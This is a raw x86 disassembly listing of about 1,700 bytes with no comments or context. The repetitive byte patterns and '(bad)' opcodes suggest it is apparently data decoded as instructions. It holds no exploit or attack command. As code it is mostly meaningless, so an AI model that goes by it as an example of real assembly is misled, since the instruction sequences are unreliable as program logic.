  444748:	add    BYTE PTR [eax],al
  44474a:	inc    DWORD PTR [eax]
  44474c:	add    BYTE PTR [eax],al
  44474e:	inc    DWORD PTR [eax]
  444750:	add    BYTE PTR [eax],al
  444752:	inc    DWORD PTR [eax]
  444754:	add    BYTE PTR [eax],al
  444756:	inc    DWORD PTR [eax]
  444758:	add    BYTE PTR [eax],al
  44475a:	inc    DWORD PTR [eax]
  44475c:	add    BYTE PTR [ecx],al
  44475e:	inc    DWORD PTR [eax]
  444760:	add    BYTE PTR [edi+edi*8],al
  444763:	add    BYTE PTR [eax],al
  444765:	push   cs
  444766:	inc    DWORD PTR [eax]
  444768:	add    BYTE PTR [ebx],ah
  44476a:	inc    DWORD PTR [eax]
  44476c:	add    BYTE PTR [ebp-0x1],al
  44476f:	push   es
  444770:	add    eax,0xd00ff66
  444775:	out    dx,al
  444776:	call   DWORD PTR [edx]
  444778:	sbb    eax,0x111eff9e
  44477d:	add    bh,bh
  44477f:	adc    DWORD PTR [eax],ebx
  444781:	inc    ebp
  444782:	dec    DWORD PTR ds:0xaffa014
  444788:	or     cl,al
  44478a:	call   FWORD PTR ds:0x17ff591d
  444790:	adc    eax,0xff24
  444795:	(bad)  
  444796:	inc    DWORD PTR [eax]
  444798:	add    cl,bl
  44479a:	dec    DWORD PTR [ebx]
  44479c:	or     al,0x6b
  44479e:	call   DWORD PTR [edi+edx*1]
  4447a1:	push   esp
  4447a2:	dec    DWORD PTR [eax]
  4447a4:	or     ch,BYTE PTR [eax-0x1]
  4447a7:	push   cs
  4447a8:	adc    BYTE PTR [edi],dh
  4447aa:	dec    DWORD PTR [edx]
  4447ac:	or     al,0x3c
  4447ae:	dec    DWORD PTR [esi]
  4447b0:	(bad)  
  4447b2:	call   DWORD PTR [eax]
  4447b4:	adc    DWORD PTR [edi+edi*8],esi
  4447b7:	pop    ss
  4447b8:	sbb    al,0x69
  4447ba:	inc    DWORD PTR [eax]
  4447bc:	add    DWORD PTR [esi-0x46fffe01],ecx
  4447c2:	call   DWORD PTR [edi]
  4447c4:	adc    dh,BYTE PTR [eax-0x1]
  4447c7:	sbb    bl,BYTE PTR [edx]
  4447c9:	xor    bh,bh
  4447cb:	adc    edx,DWORD PTR [edi+esi*1]
  4447ce:	call   DWORD PTR ds:0x13ff3d14
  4447d4:	push   ss
  4447d5:	cmp    edi,edi
  4447d7:	adc    dl,BYTE PTR [ecx]
  4447d9:	inc    ecx
  4447da:	call   DWORD PTR [edi]
  4447dc:	sbb    dl,BYTE PTR [ebx-0x1]
  4447df:	sbb    al,0x18
  4447e1:	dec    edi
  4447e2:	jmp    DWORD PTR [edx]
  4447e4:	sbb    BYTE PTR [edx-0x1],dl
  4447e7:	sbb    DWORD PTR [esi],ebx
  4447e9:	push   0x4e160bff
  4447ee:	dec    DWORD PTR [edi]
  4447f0:	sbb    esp,DWORD PTR [edx-0x1]
  4447f3:	sbb    edx,DWORD PTR [ecx]
  4447f5:	inc    ebx
  4447f6:	jmp    DWORD PTR [eax]
  4447f8:	sbb    BYTE PTR [edi-0x1],cl
  4447fb:	pop    ss
  4447fc:	pop    ss
  4447fd:	xor    edi,edi
  4447ff:	adc    al,0x19
  444801:	pusha  
  444802:	dec    DWORD PTR [edi]
  444804:	sbb    bh,BYTE PTR [edi+edi*8+0x10]
  444808:	sbb    ebx,DWORD PTR [ebp-0x1]
  44480b:	and    al,0x1c
  44480d:	jmp    DWORD PTR cs:[ebx]
  444810:	sbb    al,0x39
  444812:	call   FWORD PTR [ecx]
  444814:	adc    eax,0x211aff23
  444819:	and    eax,0xe9250fff
  44481e:	call   DWORD PTR [edi+ecx*1]
  444821:	and    edi,edi
  444823:	adc    eax,0xffd12e
  444828:	sbb    esi,ebp
  44482a:	inc    DWORD PTR [eax]
  44482c:	add    BYTE PTR [edx+0x480000ff],al
  444832:	inc    DWORD PTR [eax]
  444834:	add    BYTE PTR [ecx],ah
  444836:	inc    DWORD PTR [eax]
  444838:	add    BYTE PTR [ecx],cl
  44483a:	inc    DWORD PTR [eax]
  44483c:	add    BYTE PTR [eax],al
  44483e:	inc    DWORD PTR [eax]
  444840:	add    BYTE PTR [eax],al
  444842:	inc    DWORD PTR [eax]
  444844:	add    BYTE PTR [eax],al
  444846:	inc    DWORD PTR [eax]
  444848:	add    BYTE PTR [eax],al
  44484a:	inc    DWORD PTR [eax]
  44484c:	add    BYTE PTR [eax],al
  44484e:	inc    DWORD PTR [eax]
  444850:	add    BYTE PTR [eax],al
  444852:	inc    DWORD PTR [eax]
  444854:	add    BYTE PTR [eax],al
  444856:	inc    DWORD PTR [eax]
  444858:	add    BYTE PTR [eax],al
  44485a:	inc    DWORD PTR [eax]
  44485c:	add    BYTE PTR [ecx],al
  44485e:	inc    DWORD PTR [eax]
  444860:	add    BYTE PTR [eax],cl
  444862:	inc    DWORD PTR [eax]
  444864:	add    BYTE PTR [edi+edi*8],bl
  444867:	add    BYTE PTR [eax],al
  444869:	inc    DWORD PTR ds:[eax]
  44486c:	add    BYTE PTR [eax-0x1],dh
  44486f:	add    BYTE PTR [edx],al
  444871:	mov    ecx,0xc9230dff
  444876:	call   DWORD PTR [eax+eiz*1]
  444879:	pop    ebp
  44487a:	inc    DWORD PTR [edi]
  44487c:	or     edi,DWORD PTR [edx]
  44487e:	call   DWORD PTR [edi]
  444880:	adc    al,BYTE PTR [edi-0x1]
  444883:	sbb    dl,BYTE PTR [edi]
  444885:	push   ecx
  444886:	call   DWORD PTR ds:0xdff3410
  44488c:	or     ch,BYTE PTR [ecx]
  44488e:	inc    DWORD PTR [edx]
  444890:	or     DWORD PTR [edx-0x1efff01],ebp
  444896:	inc    DWORD PTR [ebx]
  444898:	or     DWORD PTR [ebx+0x37110eff],edi
  44489e:	inc    DWORD PTR [edi]
  4448a0:	or     eax,0x1211ff83
  4448a5:	cmp    edi,edi
  4448a7:	sbb    BYTE PTR [edi],dl
  4448a9:	xor    edi,edi
  4448ab:	push   ss
  4448ac:	pop    ss
  4448ad:	inc    edx
  4448ae:	call   DWORD PTR ds:0x16ff3f16
  4448b4:	push   ss
  4448b5:	aas    
  4448b6:	dec    DWORD PTR [ebx+edx*1]
  4448b9:	xor    al,0xff
  4448bb:	or     dl,BYTE PTR [eax]
  4448bd:	xor    edi,edi
  4448bf:	adc    al,0x15
  4448c1:	sbb    bh,bh
  4448c3:	pop    es
  4448c4:	or     DWORD PTR [edi-0x1],ebp
  4448c7:	pop    ds
  4448c8:	and    ebx,DWORD PTR [ecx-0x1]
  4448cb:	sbb    BYTE PTR ds:0xd02ff4c,bl
  4448d1:	cmp    edi,edi
  4448d3:	sub    BYTE PTR [eax],ch
  4448d5:	push   ebx
  4448d6:	call   FWORD PTR ds:0x5ff2f16
  4448dc:	pop    es
  4448dd:	sbb    bh,bh
  4448df:	pop    ds
  4448e0:	and    BYTE PTR [edi+edi*8],dh
  4448e3:	femms  
  4448e5:	sub    edi,edi
  4448e7:	sbb    dl,BYTE PTR [edi]
  4448e9:	and    al,0xff
  4448eb:	push   cs
  4448ec:	push   cs
  4448ed:	sub    bh,bh
  4448ef:	add    BYTE PTR [eax],al
  4448f1:	and    bh,bh
  4448f3:	sbb    esp,DWORD PTR [ecx]
  4448f5:	dec    esp
  4448f6:	call   FWORD PTR [edx]
  4448f8:	and    BYTE PTR [ecx],bh
  4448fa:	inc    DWORD PTR [esi+eax*1]
  4448fd:	sar    edi,0xe
  444900:	or     al,0xc8
  444902:	push   DWORD PTR [eax]
  444904:	sub    bl,BYTE PTR [esi]
  444906:	dec    DWORD PTR [eax]
  444908:	push   es
  444909:	retf   0xff
  44490c:	pop    ss
  44490d:	sti    
  44490e:	inc    DWORD PTR [eax]
  444910:	add    al,0xb3
  444912:	inc    DWORD PTR [eax]
  444914:	add    BYTE PTR [edi+edi*8+0x0],dl
  444918:	add    BYTE PTR ds:0x130000ff,ch
  44491e:	inc    DWORD PTR [eax]
  444920:	add    BYTE PTR [esi],al
  444922:	inc    DWORD PTR [eax]
  444924:	add    BYTE PTR [edx],al
  444926:	inc    DWORD PTR [eax]
  444928:	add    BYTE PTR [ecx],al
  44492a:	inc    DWORD PTR [eax]
  44492c:	add    BYTE PTR [eax],al
  44492e:	inc    DWORD PTR [eax]
  444930:	add    BYTE PTR [eax],al
  444932:	inc    DWORD PTR [eax]
  444934:	add    BYTE PTR [eax],al
  444936:	inc    DWORD PTR [eax]
  444938:	add    BYTE PTR [eax],al
  44493a:	inc    DWORD PTR [eax]
  44493c:	add    BYTE PTR [eax],al
  44493e:	inc    DWORD PTR [eax]
  444940:	add    BYTE PTR [eax],al
  444942:	inc    DWORD PTR [eax]
  444944:	add    BYTE PTR [eax],al
  444946:	inc    DWORD PTR [eax]
  444948:	add    BYTE PTR [eax],al
  44494a:	inc    DWORD PTR [eax]
  44494c:	add    BYTE PTR [eax],al
  44494e:	inc    DWORD PTR [eax]
  444950:	add    BYTE PTR [eax],al
  444952:	inc    DWORD PTR [eax]
  444954:	add    BYTE PTR [eax],al
  444956:	inc    DWORD PTR [eax]
  444958:	add    BYTE PTR [eax],al
  44495a:	inc    DWORD PTR [eax]
  44495c:	add    BYTE PTR [eax],al
  44495e:	inc    DWORD PTR [eax]
  444960:	add    BYTE PTR [ecx],al
  444962:	inc    DWORD PTR [eax]
  444964:	add    BYTE PTR [eax],cl
  444966:	inc    DWORD PTR [eax]
  444968:	add    BYTE PTR [edi],dl
  44496a:	inc    DWORD PTR [eax]
  44496c:	add    BYTE PTR [edx],dh
  44496e:	inc    DWORD PTR [ecx]
  444970:	add    DWORD PTR [edx-0x1],ebx
  444973:	add    BYTE PTR [edx],al
  444975:	sahf   
  444976:	inc    DWORD PTR [eax]
  444978:	or     eax,0x1d16ffee
  44497d:	arpl   di,di
  44497f:	push   ds
  444980:	push   ds
  444981:	and    eax,0xae0100ff
  444986:	inc    DWORD PTR [eax]
  444988:	add    dl,ch
  44498a:	call   DWORD PTR [esi]
  44498c:	pop    ss
  44498d:	xchg   edi,eax
  44498e:	call   FWORD PTR [eax]
  444990:	push   ss
  444991:	push   cs
  444992:	inc    DWORD PTR [edx]
  444994:	add    ch,BYTE PTR [ebx-0x23ffff01]
  44499a:	inc    DWORD PTR [eax]
  44499c:	add    ch,ch
  44499e:	dec    DWORD PTR [esi]
  4449a0:	setae  bh
  4449a3:	or     ecx,DWORD PTR [edi*1+0x330908ff]
  4449aa:	dec    DWORD PTR [ebx]
  4449ac:	or     dh,BYTE PTR [ecx]
  4449ae:	dec    DWORD PTR [edi]
  4449b0:	getsec 
  4449b2:	call   DWORD PTR [ecx]
  4449b4:	adc    dh,BYTE PTR [edi+edi*8]
  4449b7:	sbb    bl,BYTE PTR [ecx]
  4449b9:	(bad)  
  4449ba:	inc    DWORD PTR [ebx]
  4449bc:	add    DWORD PTR [edi-0x1],esi
  4449bf:	add    BYTE PTR [eax],al
  4449c1:	mov    eax,0x9f0e12ff
  4449c6:	call   FWORD PTR [esi]
  4449c8:	push   ds
  4449c9:	aaa    
  4449ca:	call   FWORD PTR [eax]
  4449cc:	sbb    DWORD PTR [edi+edi*8+0x15],eax
  4449d0:	push   ss
  4449d1:	notrack call DWORD PTR [eax]
  4449d4:	adc    al,0x3e
  4449d6:	dec    DWORD PTR [ecx]
  4449d8:	pop    es
  4449d9:	xor    edi,edi
  4449db:	push   cs
  4449dc:	push   cs
  4449dd:	inc    ebp
  4449de:	call   FWORD PTR [ecx]
  4449e0:	adc    eax,0xf12ff31
  4449e5:	sub    al,0xff
  4449e7:	or     dl,BYTE PTR [ebx]
  4449e9:	push   ebx
  4449ea:	call   DWORD PTR [ecx]
  4449ec:	adc    al,0x74
  4449ee:	call   DWORD PTR [edi]
  4449f0:	adc    eax,0x1810ff4f
  4449f5:	inc    ecx
  4449f6:	call   DWORD PTR [edi]
  4449f8:	sbb    DWORD PTR [esi-0x1],ebx
  4449fb:	push   ds
  4449fc:	sbb    esi,DWORD PTR [eax]
  4449fe:	dec    DWORD PTR [edi]
  444a00:	adc    BYTE PTR [ebx-0x1],ch
  444a03:	add    ecx,DWORD PTR [eax]
  444a05:	retf   0xdff
  444a08:	sbb    edi,DWORD PTR [esi]
  444a0a:	jmp    DWORD PTR [ecx]
  444a0c:	pop    ds
  444a0d:	aas    
  444a0e:	call   FWORD PTR [edi]
  444a10:	sbb    DWORD PTR [edi+edi*8],esi
  444a13:	and    bl,BYTE PTR [edi]
  444a15:	dec    edx
  444a16:	dec    DWORD PTR [edi]
  444a18:	push   ds
  444a19:	iret   
  444a1a:	jmp    DWORD PTR ds:0x1eff432f
  444a20:	pop    ss
  444a21:	pop    es
  444a22:	call   DWORD PTR ds:0xffb126
  444a28:	add    ebp,esi
  444a2a:	inc    DWORD PTR [eax]
  444a2c:	add    BYTE PTR [edi+edi*8-0xb10000],cl
  444a33:	add    BYTE PTR [eax],al
  444a35:	and    eax,0xb0000ff
  444a3a:	inc    DWORD PTR [eax]
  444a3c:	add    BYTE PTR [eax],al
  444a3e:	inc    DWORD PTR [eax]
  444a40:	add    BYTE PTR [eax],al
  444a42:	inc    DWORD PTR [eax]
  444a44:	add    BYTE PTR [eax],al
  444a46:	inc    DWORD PTR [eax]
  444a48:	add    BYTE PTR [eax],al
  444a4a:	inc    DWORD PTR [eax]
  444a4c:	add    BYTE PTR [eax],al
  444a4e:	inc    DWORD PTR [eax]
  444a50:	add    BYTE PTR [eax],al
  444a52:	inc    DWORD PTR [eax]
  444a54:	add    BYTE PTR [eax],al
  444a56:	inc    DWORD PTR [eax]
  444a58:	add    BYTE PTR [ecx],al
  444a5a:	inc    DWORD PTR [eax]
  444a5c:	add    BYTE PTR ds:0x100000ff,al
  444a62:	inc    DWORD PTR [eax]
  444a64:	add    BYTE PTR [edx],ch
  444a66:	inc    DWORD PTR [eax]
  444a68:	add    BYTE PTR [edx-0x1],dl
  444a6b:	add    BYTE PTR [eax],al
  444a6d:	xchg   edi,edi
  444a6f:	add    BYTE PTR [esi],cl
  444a71:	loop   0x444a72
  444a73:	adc    ah,BYTE PTR [edx]
  444a75:	(bad)  
  444a76:	dec    DWORD PTR [ebx]
  444a78:	push   cs
  444a79:	push   ebx
  444a7a:	inc    DWORD PTR [esi+eax*1]
  444a7d:	cmp    edi,edi
  444a7f:	pop    ss
  444a80:	adc    al,BYTE PTR [edi-0x1]
  444a83:	or     eax,0xfff400b
  444a88:	or     al,0x31
  444a8a:	inc    DWORD PTR [edi]
  444a8c:	or     ch,BYTE PTR [esi-0x1]
  444a8f:	add    BYTE PTR [ebx],cl
  444a91:	cld    
  444a92:	inc    DWORD PTR [ecx]
  444a94:	or     cl,dl
  444a96:	dec    DWORD PTR [esi]
  444a98:	adc    bh,BYTE PTR [ebx]
  444a9a:	call   DWORD PTR [ecx]
  444a9c:	adc    ch,BYTE PTR [ecx]
  444a9e:	dec    DWORD PTR [edi]
  444aa0:	adc    dh,BYTE PTR ds:0x431615ff
  444aa6:	call   DWORD PTR ds:0x19ff4318
  444aac:	pop    ss
  444aad:	cmp    eax,0x401717ff
  444ab2:	dec    DWORD PTR [edi]
  444ab4:	ucomiss xmm7,xmm7
  444ab7:	pop    es
  444ab8:	cvtpi2ps xmm7,mm7
  444abb:	movlps QWORD PTR ds:0x3f0e0dff,xmm6
  444ac2:	call   DWORD PTR [edx+edx*1]
  444ac5:	dec    ecx
  444ac6:	call   DWORD PTR [esi]
  444ac8:	adc    eax,0xe06ff34
  444acd:	xor    bh,bh
  444acf:	adc    dl,BYTE PTR [esi]
  444ad1:	cmp    bh,bh
  444ad3:	sub    BYTE PTR [ebx],ah
  444ad5:	inc    DWORD PTR ds:[esi]
  444ad8:	add    eax,0xf0dff1b
  444add:	sub    bh,bh
  444adf:	sbb    al,0x1b
  444ae1:	xor    bh,bh
  444ae3:	adc    edx,DWORD PTR [edx]
  444ae5:	xor    al,0xff
  444ae7:	and    BYTE PTR [ebp*1+0x2c0e0eff],bl
  444aee:	inc    DWORD PTR [esi]
  444af0:	or     BYTE PTR ds:0x42221aff,bh
  444af6:	call   DWORD PTR [edx]
  444af8:	sbb    DWORD PTR [ecx-0x1],edi
  444afb:	add    DWORD PTR [eax],eax
  444afd:	out    0xff,al
  444aff:	add    al,0x2
  444b01:	loopne 0x444b02
  444b03:	push   es
  444b04:	add    eax,0x900ffaa
  444b09:	(bad)  
  444b0a:	inc    DWORD PTR [ebx]
  444b0c:	or     eax,0xffef
  444b11:	mov    bl,0xff
  444b13:	add    BYTE PTR [eax],al
  444b15:	dec    edx
  444b16:	inc    DWORD PTR [eax]
  444b18:	add    BYTE PTR ds:0xe0000ff,ah
  444b1e:	inc    DWORD PTR [eax]
  444b20:	add    BYTE PTR [ebx],al
  444b22:	inc    DWORD PTR [eax]
  444b24:	add    BYTE PTR [eax],al
  444b26:	inc    DWORD PTR [eax]
  444b28:	add    BYTE PTR [eax],al
  444b2a:	inc    DWORD PTR [eax]
  444b2c:	add    BYTE PTR [eax],al
  444b2e:	inc    DWORD PTR [eax]
  444b30:	add    BYTE PTR [eax],al
  444b32:	inc    DWORD PTR [eax]
  444b34:	add    BYTE PTR [eax],al
  444b36:	inc    DWORD PTR [eax]
  444b38:	add    BYTE PTR [eax],al
  444b3a:	inc    DWORD PTR [eax]
  444b3c:	add    BYTE PTR [eax],al
  444b3e:	inc    DWORD PTR [eax]
  444b40:	add    BYTE PTR [eax],al
  444b42:	inc    DWORD PTR [eax]
  444b44:	add    BYTE PTR [eax],al
  444b46:	inc    DWORD PTR [eax]
  444b48:	add    BYTE PTR [eax],al
  444b4a:	inc    DWORD PTR [eax]
  444b4c:	add    BYTE PTR [eax],al
  444b4e:	inc    DWORD PTR [eax]
  444b50:	add    BYTE PTR [eax],al
  444b52:	inc    DWORD PTR [eax]
  444b54:	add    BYTE PTR [eax],al
  444b56:	inc    DWORD PTR [eax]
  444b58:	add    BYTE PTR [eax],al
  444b5a:	inc    DWORD PTR [eax]
  444b5c:	add    BYTE PTR [eax],al
  444b5e:	inc    DWORD PTR [eax]
  444b60:	add    BYTE PTR [ecx],al
  444b62:	inc    DWORD PTR [eax]
  444b64:	add    BYTE PTR ds:0x100000ff,al
  444b6a:	inc    DWORD PTR [eax]
  444b6c:	add    BYTE PTR [ebx],ah
  444b6e:	inc    DWORD PTR [eax]
  444b70:	add    BYTE PTR [ebx-0x1],al
  444b73:	add    BYTE PTR [eax],al
  444b75:	ins    DWORD PTR es:[edi],dx
  444b76:	inc    DWORD PTR [eax]
  444b78:	add    BYTE PTR [eax-0xcf5ff01],dh
  444b7e:	jmp    DWORD PTR [edx]
  444b80:	daa    
  444b81:	push   ebp
  444b82:	dec    DWORD PTR [esi+eax*1]
  444b85:	jp     0x444b86
  444b87:	add    BYTE PTR [eax],al
  444b89:	pop    ecx
  444b8a:	call   DWORD PTR [ecx]
  444b8c:	adc    ebp,DWORD PTR [ebp-0x1]
  444b8f:	and    al,0x20
  444b91:	cmp    bh,bh
  444b93:	or     al,0xd
  444b95:	jge    0x444b96
  444b97:	add    BYTE PTR [eax],al
  444b99:	retf   
  444b9a:	inc    DWORD PTR [eax]
  444b9c:	add    bl,ch
  444b9e:	dec    DWORD PTR [edx]
  444ba0:	or     DWORD PTR [edi+edi*8],edi
  444ba3:	adc    al,0x17
  444ba5:	xor    bh,bh
  444ba7:	push   es
  444ba8:	add    eax,0x908ff31
  444bad:	cmp    al,0xff
  444baf:	or     DWORD PTR [edx],ecx
  444bb1:	inc    DWORD PTR ss:[ebx]
  444bb4:	add    ebx,DWORD PTR [esi]
  444bb6:	call   FWORD PTR [edi]
  444bb8:	sbb    esp,DWORD PTR [ebx-0x1]
  444bbb:	or     cl,BYTE PTR [ebx]
  444bbd:	jle    0x444bbe
  444bbf:	add    BYTE PTR [eax],al
  444bc1:	mov    cl,0xff
  444bc3:	pop    es
  444bc4:	add    eax,0x191cffae
  444bc9:	xor    bh,bh
  444bcb:	sbb    BYTE PTR [edi],dl
  444bcd:	inc    ecx
  444bce:	call   DWORD PTR [esp+edx*1]
  444bd1:	cmp    al,0xff
  444bd3:	sbb    DWORD PTR [eax],ebx
  444bd5:	cmp    bh,bh
  444bd7:	or     al,0x9
  444bd9:	sub    bh,bh
  444bdb:	or     al,0xf
  444bdd:	inc    esp
  444bde:	call   FWORD PTR [esi]
  444be0:	sbb    cl,BYTE PTR [eax-0x1]
  444be3:	push   cs
  444be4:	adc    BYTE PTR [edi],bh
  444be6:	inc    DWORD PTR ds:0xcff1a08
  444bec:	or     DWORD PTR [ecx-0x1],esp
  444bef:	sbb    ebx,DWORD PTR [eax]
  444bf1:	dec    ecx
  444bf2:	call   DWORD PTR [ebx]
  444bf4:	adc    BYTE PTR [ecx],dh
  444bf6:	call   DWORD PTR [edx]
  444bf8:	push   ss
  444bf9:	inc    ebp
  444bfa:	call   FWORD PTR [edi]
  444bfc:	sbb    BYTE PTR [eax],dh
  444bfe:	call   DWORD PTR ds:0xff6213
  444c04:	add    ah,ch
  444c06:	inc    DWORD PTR [ebx]
  444c08:	or     BYTE PTR [edi+edi*8+0x10],cl
  444c0c:	adc    dh,BYTE PTR [edx]
  444c0e:	call   DWORD PTR ds:0x16ff2c0f
  444c14:	adc    al,0x40
  444c16:	dec    DWORD PTR [edx]
  444c18:	adc    DWORD PTR [ecx-0x1],edi
  444c1b:	push   ds
  444c1c:	sbb    eax,0x1514ff46
  444c21:	sub    bh,bh
  444c23:	adc    dl,BYTE PTR [ebx]
  444c25:	mov    bh,bh
  444c27:	add    BYTE PTR [esi],al
  444c29:	out    dx,eax
  444c2a:	inc    DWORD PTR [eax]
  444c2c:	add    DWORD PTR [ebp+0x550000ff],edx
  444c32:	inc    DWORD PTR [eax]
  444c34:	add    BYTE PTR [ecx],ch
  444c36:	inc    DWORD PTR [eax]
  444c38:	add    BYTE PTR ds:0xff,cl
  444c3e:	inc    DWORD PTR [eax]
  444c40:	add    BYTE PTR [eax],al
  444c42:	inc    DWORD PTR [eax]
  444c44:	add    BYTE PTR [eax],al
  444c46:	inc    DWORD PTR [eax]
  444c48:	add    BYTE PTR [eax],al
  444c4a:	inc    DWORD PTR [eax]
  444c4c:	add    BYTE PTR [eax],al
  444c4e:	inc    DWORD PTR [eax]
  444c50:	add    BYTE PTR [eax],al
  444c52:	inc    DWORD PTR [eax]
  444c54:	add    BYTE PTR [ecx],al
  444c56:	inc    DWORD PTR [eax]
  444c58:	add    BYTE PTR ds:0xd0000ff,al
  444c5e:	inc    DWORD PTR [eax]
  444c60:	add    BYTE PTR [eax],ah
  444c62:	inc    DWORD PTR [eax]
  444c64:	add    BYTE PTR [eax-0x1],al
  444c67:	add    BYTE PTR [eax],al
  444c69:	outs   dx,DWORD PTR ds:[esi]
  444c6a:	inc    DWORD PTR [eax]
  444c6c:	add    BYTE PTR [esi-0xadcfc01],ah
  444c72:	call   DWORD PTR [eax]
  444c74:	sbb    DWORD PTR [eax-0x1],ebx
  444c77:	add    eax,0x10ff3806
  444c7c:	adc    BYTE PTR [ebx-0x1],al
  444c7f:	push   cs
  444c80:	push   cs
  444c81:	dec    DWORD PTR ds:[ecx*1+0x404ff3c]
  444c89:	xor    eax,0xbd0900ff
  444c8e:	inc    DWORD PTR [esp+ecx*1]
  444c91:	int3   
  444c92:	dec    DWORD PTR [ecx+edx*1]
  444c95:	push   ebx
  444c96:	call   DWORD PTR [eax]
  444c98:	adc    esp,DWORD PTR [ecx]
  444c9a:	call   DWORD PTR [eax]
  444c9c:	adc    BYTE PTR [ecx],bh
  444c9e:	dec    DWORD PTR [esi+ecx*1]
  444ca1:	inc    eax
  444ca2:	call   DWORD PTR [ebx]
  444ca4:	adc    al,0x44
  444ca6:	call   DWORD PTR [eax]
  444ca8:	adc    DWORD PTR [edx],esi
  444caa:	dec    DWORD PTR [esi]
  444cac:	sysenter 
  444cae:	call   DWORD PTR [edx]
  444cb0:	adc    dh,BYTE PTR [edi]
  444cb2:	dec    DWORD PTR [edi]
  444cb4:	adc    DWORD PTR [ebx],esi
  444cb6:	dec    DWORD PTR [edi]
  444cb8:	adc    DWORD PTR [edi],esi
  444cba:	dec    DWORD PTR [ebx]
  444cbc:	push   cs
  444cbd:	sub    eax,0x54181aff
  444cc2:	jmp    FWORD PTR [edx]
  444cc4:	and    DWORD PTR [esi],edi
  444cc6:	call   DWORD PTR ds:0xbff3413
  444ccc:	or     al,0x32
  444cce:	call   FWORD PTR [esi]
  444cd0:	sbb    DWORD PTR [eax],edi
  444cd2:	call   DWORD PTR [esi]
  444cd4:	adc    ch,BYTE PTR [edi+edi*8]
  444cd7:	add    BYTE PTR [eax],al
  444cd9:	sbb    al,0xff
  444cdb:	or     ecx,DWORD PTR [ebx]
  444cdd:	xor    edi,edi
  444cdf:	adc    DWORD PTR [ecx],edx
  444ce1:	sub    bh,bh
  444ce3:	sbb    eax,0x25ff351d
  444ce8:	and    DWORD PTR [edi],ebp
  444cea:	call   FWORD PTR ds:0x9ff2b1a
  444cf0:	or     al,0x3f
  444cf2:	call   DWORD PTR [ebx*1+0x241bff59]
  444cf9:	inc    esi
  444cfa:	inc    DWORD PTR [eax]
  444cfc:	add    esp,eax
  444cfe:	inc    DWORD PTR [eax]
  444d00:	add    ebp,ecx
  444d02:	inc    DWORD PTR [eax]
  444d04:	pop    es
  444d05:	cmc    
  444d06:	inc    DWORD PTR [ebx]
  444d08:	or     ebp,ebp
  444d0a:	inc    DWORD PTR [edx]
  444d0c:	add    al,BYTE PTR [ecx+0x660000ff]
  444d12:	inc    DWORD PTR [eax]
  444d14:	add    BYTE PTR [ebx],bh
  444d16:	inc    DWORD PTR [eax]
  444d18:	add    BYTE PTR ds:0xb0000ff,bl
  444d1e:	inc    DWORD PTR [eax]
  444d20:	add    BYTE PTR [edx],al
  444d22:	inc    DWORD PTR [eax]
  444d24:	add    BYTE PTR [eax],al
  444d26:	inc    DWORD PTR [eax]
  444d28:	add    BYTE PTR [eax],al
  444d2a:	inc    DWORD PTR [eax]
  444d2c:	add    BYTE PTR [eax],al
  444d2e:	inc    DWORD PTR [eax]
  444d30:	add    BYTE PTR [eax],al
  444d32:	inc    DWORD PTR [eax]
  444d34:	add    BYTE PTR [eax],al
  444d36:	inc    DWORD PTR [eax]
  444d38:	add    BYTE PTR [eax],al
  444d3a:	inc    DWORD PTR [eax]
  444d3c:	add    BYTE PTR [eax],al
  444d3e:	inc    DWORD PTR [eax]
  444d40:	add    BYTE PTR [eax],al
  444d42:	inc    DWORD PTR [eax]
  444d44:	add    BYTE PTR [eax],al
  444d46:	inc    DWORD PTR [eax]
  444d48:	add    BYTE PTR [eax],al
  444d4a:	inc    DWORD PTR [eax]
  444d4c:	add    BYTE PTR [eax],al
  444d4e:	inc    DWORD PTR [eax]
  444d50:	add    BYTE PTR [eax],al
  444d52:	inc    DWORD PTR [eax]
  444d54:	add    BYTE PTR [eax],al
  444d56:	inc    DWORD PTR [eax]
  444d58:	add    BYTE PTR [eax],al
  444d5a:	inc    DWORD PTR [eax]
  444d5c:	add    BYTE PTR [eax],al
  444d5e:	inc    DWORD PTR [eax]
  444d60:	add    BYTE PTR [eax],al
  444d62:	inc    DWORD PTR [eax]
  444d64:	add    BYTE PTR [ebx],al
  444d66:	inc    DWORD PTR [eax]
  444d68:	add    BYTE PTR [eax],cl
  444d6a:	inc    DWORD PTR [eax]
  444d6c:	add    BYTE PTR ds:0x2a0000ff,dl
  444d72:	inc    DWORD PTR [eax]
  444d74:	add    BYTE PTR [edx-0x1],cl
  444d77:	add    BYTE PTR [eax],al
  444d79:	jae    0x444d7a
  444d7b:	add    BYTE PTR [eax],al
  444d7d:	stos   DWORD PTR es:[edi],eax
  444d7e:	inc    DWORD PTR [eax]
  444d80:	add    ah,ah
  444d82:	dec    DWORD PTR [edx]
  444d84:	pop    ss
  444d85:	sar    bh,0x2d
  444d88:	and    eax,0x1418ff09
  444d8d:	sub    bh,bh
  444d8f:	and    bl,BYTE PTR [esp+edi*1]
  444d92:	dec    DWORD PTR [edi]
  444d94:	or     al,0x58
  444d96:	inc    DWORD PTR [eax]
  444d98:	add    bh,cl
  444d9a:	inc    DWORD PTR [eax]
  444d9c:	add    ah,ch
  444d9e:	dec    DWORD PTR [esi]
  444da0:	adc    DWORD PTR [eax-0x1],edx
  444da3:	sbb    ebx,DWORD PTR [ebx]
  444da5:	inc    eax
  444da6:	dec    DWORD PTR ds:0xeff2f0c
  444dac:	(bad)  
  444dae:	call   DWORD PTR [ecx]
  444db0:	adc    DWORD PTR [eax-0x1],eax
  444db3:	or     al,0xf
  444db5:	xor    bh,bh
  444db7:	sbb    eax,0x12ff5219
  444dbc:	(bad)  
  444dbe:	inc    DWORD PTR [eax]
  444dc0:	add    BYTE PTR [eax-0x31fdfc01],ch
  444dc6:	call   DWORD PTR [ebx]
  444dc8:	adc    edi,DWORD PTR [ebp-0x1]
  444dcb:	sbb    ebx,DWORD PTR [edx+esi*1]
  444dce:	call   DWORD PTR ds:0x11ff3c12
  444dd4:	adc    BYTE PTR [ecx],dh
  444dd6:	dec    DWORD PTR ds:0x11ff2909
  444ddc:	sbb    DWORD PTR [ebx-0x1],ebp
  444ddf:	adc    bl,BYTE PTR [edi]
  444de1:	jb     0x444de2
  444de3:	adc    eax,0x4ff4818
  444de8:	sets   bh
  444deb:	add    al,0xa
  444ded:	mov    ecx,0x3a1315ff
  444df2:	call   DWORD PTR [ebx]
  444df4:	or     eax,0xf0eff2a
  444df9:	sub    bh,bh
  444dfb:	sbb    al,0x17
  444dfd:	cmp    eax,0x221919ff
  444e02:	inc    DWORD PTR [esi]
  444e04:	or     DWORD PTR [ebx-0x36ffff01],edi
  444e0a:	dec    DWORD PTR [edi]
  444e0c:	adc    edi,DWORD PTR [edi+edi*8]
